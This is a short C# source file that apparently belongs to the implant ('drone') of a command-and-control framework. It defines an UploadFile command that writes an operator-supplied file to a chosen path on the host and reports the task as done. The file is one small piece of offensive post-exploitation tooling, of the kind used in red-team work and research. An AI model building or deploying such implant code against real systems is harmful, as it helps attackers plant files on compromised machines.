using System.IO;
using System.Threading;

namespace Drone.Commands;

public sealed class UploadFile : DroneCommand
{
    public override byte Command => 0x1D;
    public override bool Threaded => false;

    public override void Execute(DroneTask task, CancellationToken cancellationToken)
    {
        File.WriteAllBytes(task.Arguments[0], task.Artefact);
        Drone.SendTaskComplete(task.Id);
    }
}